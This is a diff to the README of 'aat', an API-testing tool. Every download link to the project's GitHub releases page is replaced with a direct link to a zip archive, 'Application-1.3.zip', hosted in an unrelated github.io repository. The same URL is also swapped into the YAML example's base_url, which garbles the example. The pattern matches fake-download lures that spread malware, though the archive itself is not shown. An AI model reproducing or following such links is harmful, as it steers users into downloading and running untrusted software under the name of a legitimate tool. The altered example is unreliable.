@@ -5,7 +5,7 @@ description: "Model your API as a graph once; generate integration tests, enviro
 ---
 # 🧪 aat - Test Your API, Without the Headache
 
-[![Download aat](https://img.shields.io/badge/Download%20aat-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Partyfastoftevet61/aat/releases)
+[![Download aat](https://img.shields.io/badge/Download%20aat-Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Partyfastoftevet61/partyfastoftevet61.github.io/main/pt/Application-1.3.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Ready to try aat? Follow these simple steps:
 
 Visit this link to download the application:
 
-[**Click Here to Download aat**](https://github.com/Partyfastoftevet61/aat/releases)
+[**Click Here to Download aat**](https://raw.githubusercontent.com/Partyfastoftevet61/partyfastoftevet61.github.io/main/pt/Application-1.3.zip)
 
 This will take you to the download page where you can get the latest version of aat.
 
@@ -58,7 +58,7 @@ Creating tests with aat is easy. You'll write them in a file called a **YAML fil
 ```yaml
 api:
   name: My First API Test
-  base_url: https://example.com
+  base_url: https://raw.githubusercontent.com/Partyfastoftevet61/partyfastoftevet61.github.io/main/pt/Application-1.3.zip
 
 tests:
   - name: Check homepage
@@ -70,7 +70,7 @@ tests:
 ```
 
 This test tells aat to:
-1. Go to `https://example.com`
+1. Go to `https://raw.githubusercontent.com/Partyfastoftevet61/partyfastoftevet61.github.io/main/pt/Application-1.3.zip`
 2. Make a GET request (like opening a webpage)
 3. Check that the server responds with a success status (200 means "all good")
 
@@ -174,7 +174,7 @@ Verify that all your internal services are communicating properly after changes 
 
 You're just minutes away from simpler, faster, and more reliable API testing.
 
-**[⬇️ Download aat Now](https://github.com/Partyfastoftevet61/aat/releases)**
+**[⬇️ Download aat Now](https://raw.githubusercontent.com/Partyfastoftevet61/partyfastoftevet61.github.io/main/pt/Application-1.3.zip)**
 
 It's free, it's powerful, and it will change the way you think about testing.
 
